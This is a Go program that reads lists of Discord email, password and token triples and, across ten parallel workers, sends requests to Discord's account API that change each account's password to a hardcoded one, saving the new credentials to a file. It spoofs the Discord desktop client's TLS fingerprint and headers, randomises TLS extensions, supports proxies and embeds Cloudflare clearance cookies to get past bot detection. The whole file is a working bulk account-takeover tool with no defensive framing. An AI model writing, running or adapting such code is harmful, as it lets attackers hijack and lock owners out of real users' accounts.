package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/bogdanfinn/tls-client/profiles"

	http "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
)

var (
	newPass = "Ab5SexyAhhP@ss"
	proxy   = ""

	inputFile  = "./tokens.txt"
	outputFile = "./out.txt"
)

var WrietMu sync.Mutex

func main() {
	tokens, err := ReadFileLists(inputFile)
	if err != nil {
		log.Fatal(err)
	}

	tokenChan := make(chan string)

	var wg sync.WaitGroup
	for range 10 {
		wg.Add(1)
		go thread(tokenChan, &wg)
	}

	for _, token := range tokens {
		tokenChan <- token
	}
	close(tokenChan)
	wg.Wait()

	fmt.Println("done")
}

func thread(tokenChan chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		emailPassToken, ok := <-tokenChan
		if !ok {
			break
		}

		bus := strings.Split(emailPassToken, ":")
		email, pass, token := bus[0], bus[1], bus[2]

		options := []tls_client.HttpClientOption{
			tls_client.WithTimeoutSeconds(15),
			tls_client.WithClientProfile(profiles.DefaultClientProfile),
			tls_client.WithRandomTLSExtensionOrder(),
			tls_client.WithCookieJar(tls_client.NewCookieJar()),
			tls_client.WithProxyUrl(proxy),
		}

		client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
		if err != nil {
			log.Println(err)
			return
		}

		payloadMap := map[string]string{"password": pass, "new_password": newPass}
		payloadBytes, err := json.Marshal(payloadMap)
		if err != nil {
			fmt.Println(err)
			continue
		}

		req, err := http.NewRequest(http.MethodPatch, "https://discord.com/api/v9/users/@me", bytes.NewReader(payloadBytes))
		if err != nil {
			fmt.Println(err)
			continue
		}

		req.Header = http.Header{
			`accept`: {`*/*`},
			// `accept-encoding`:    {`gzip, deflate, br`},
			`accept-language`:    {`en-US,en;q=0.9,en;q=0.8`},
			`authorization`:      {token},
			`content-length`:     {fmt.Sprint(len(payloadBytes))},
			`content-type`:       {`application/json`},
			`cookie`:             {`__dcfduid=897941203d5e11ef9d554f56d1fd7ee6; __sdcfduid=897941213d5e11ef9d554f56d1fd7ee639b06fc9dd02ca054370c0e3c72574c719cf1d23663c5d8a139990fd490a7dca; __stripe_mid=9b9a77d7-72c3-4d88-860e-bb7feb856dd405eae2; cf_clearance=g.YQ7DFFTcq6etTcVDmJyB72nP.bdHrZTL4WoS.asgU-1720787893-1.0.1.1-Spgwyzs3Ryt5XY87bZn4.HCvsWStD_A2flQR2kuc4TRfFaEJEehjT8RWFzhHKdcJC2vLoWhixZcG4q_Eo035HA; __cfruid=3eea809fc94f31ea4b01db2594e28f8d4d5a1ab8-1720890394; _cfuvid=i3XC00qhAP8KdMGJ5n.qAu450sddVQ436nySKY_U7G4-1720890394369-0.0.1.1-604800000`},
			`origin`:             {`https://discord.com`},
			`priority`:           {`u=1, i`},
			`referer`:            {`https://discord.com/channels/@me`},
			`sec-ch-ua`:          {`"Not-A.Brand";v="99", "Chromium";v="124"`},
			`sec-ch-ua-mobile`:   {`?0`},
			`sec-ch-ua-platform`: {`"Linux"`},
			`sec-fetch-dest`:     {`empty`},
			`sec-fetch-mode`:     {`cors`},
			`sec-fetch-site`:     {`same-origin`},
			`user-agent`:         {`Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.59 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36`},
			`x-debug-options`:    {`bugReporterEnabled`},
			`x-discord-locale`:   {`en-US`},
			`x-discord-timezone`: {`Asia/Riyadh`},
			`x-super-properties`: {`eyJvcyI6IkxpbnV4IiwiYnJvd3NlciI6IkRpc2NvcmQgQ2xpZW50IiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X3ZlcnNpb24iOiIwLjAuNTkiLCJvc192ZXJzaW9uIjoiNi45LjktYXJjaDEtMSIsIm9zX2FyY2giOiJ4NjQiLCJhcHBfYXJjaCI6Ing2NCIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgZGlzY29yZC8wLjAuNTkgQ2hyb21lLzEyNC4wLjYzNjcuMjQzIEVsZWN0cm9uLzMwLjEuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMzAuMS4wIiwid2luZG93X21hbmFnZXIiOiJHTk9NRSxnbm9tZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjMwOTUxMywibmF0aXZlX2J1aWxkX251bWJlciI6bnVsbCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=`},
		}

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(err)
			continue
		}
		fmt.Println(token[:30]+"...: ", resp.Status)
		text := fmt.Sprintf("%s:%s:%s", email, newPass, token)
		err = WriteFileLine(outputFile, text)
		if err != nil {
			fmt.Println("failed to save token", text, err)
		}
	}
}

func ReadFileLists(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines, scanner.Err()
}

func WriteFileLine(filePath, line string) error {
	WrietMu.Lock()
	defer WrietMu.Unlock()

	if err := os.MkdirAll(filepath.Dir(filePath), 0755); err != nil {
		return fmt.Errorf("failed to create directories: %w", err)
	}

	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	if _, err := writer.WriteString(line + "\n"); err != nil {
		return fmt.Errorf("failed to write to file: %w", err)
	}

	// Flush the buffer to ensure all data is written
	if err := writer.Flush(); err != nil {
		return fmt.Errorf("failed to flush writer: %w", err)
	}

	return nil
}
